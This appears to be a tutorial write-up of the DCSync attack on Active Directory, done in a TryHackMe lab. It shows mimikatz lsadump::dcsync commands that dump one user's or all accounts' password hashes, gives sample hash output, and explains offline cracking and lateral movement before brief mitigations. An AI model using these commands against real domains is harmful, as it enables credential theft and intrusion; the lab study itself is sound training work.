### 1. AD Replication theory
AD replication is the process of synchronizing all objects from one Domain Controller to another Domain Controller. By doing this, all the Domain Controllers in the same site and forests can have updated objects to perform authentication correctly.

### 2. What is DcSync?
DCSync is an attack based on AD replication that the adversary try to pretend as the Domain Controller to get data of all the objects, especially users' passwords and hashes. This technique is usually used for lateral movement like pass the hash or doing RDP login. Also, it can be used for persistence since attackers can use the gathered passwords to get a foothold on the domain all the time.

### 3. How DcSync works
1. Adversary compromise accounts with high privilege that have the ability to perform AD replication. By default these privileges are limited to the: domain administrators, enterprise administrators, administrators, and domain controller groups.
2. Attackers run mimikatz using the high privilege account to perform the Dcsync attacks using lsadump module. Because attackers have the credentials of the high privilege accounts, he can pretend to be the domain controller and perform DCSync
3. After retrieving all the users hashes and passwords, attacks can attempt to transfer them to their machine and crack those hashes offline to retrieve the plaintext password for other attacks such as RDP login

There are different ways that we can pretend to be high privilege account. One way is to create a forged Golden Ticket using KRBTGT account. This could help the adversary access all resources with no limitation

### 4. DcSync with mimikatz
Note: These commands run on lab environment of Tryhackme at https://tryhackme.com/room/persistingad
Once the account that has permission to replicate objects, we can run Mimikatz DcSync. For example, we can try to dump the hashes of users aaron.jones

```powershell
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:aaron.jones
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server 
[DC] 'aaron.jones' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : aaron.jones 

** SAM ACCOUNT **

SAM Username         : aaron.jones
Account Type         : 30000000 ( USER_OBJECT )    
User Account Control : 00000200 ( NORMAL_ACCOUNT ) 
Account expiration   :
Password last change : 4/25/2022 7:30:21 PM
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1429 
Object Relative ID   : 1429

Credentials:
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc 
    ntlm- 0: fbdcd5041c96ddbd82224270b57f11fc 
    lm  - 0: 0fd2685aa18c78bd265d02bdec203b04 

[...]

* Primary:WDigest * 
    01  991d45386dd3561e0c5529d3605f96e6
    02  d5d6f25b233c87b289706d7b423f1145
[...]
```

We can also dump all the hashes of objects in the DC

```powershell
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
```

### 5. Mitigations
- Create strong password of Domain Admin accounts: this could make attacker an extra mile harder to crack the password

- Monitor accounts with object replication permission: Monitoring accounts with permission to replicate can help the blue team to alert the incident if it happned from unsual IP of the activity

### 6. References
DcSync theory: https://www.qomplx.com/kerberos_dcsync_attacks_explained/

AD Replication theory: https://blog.netwrix.com/2017/02/20/active-directory-replication/
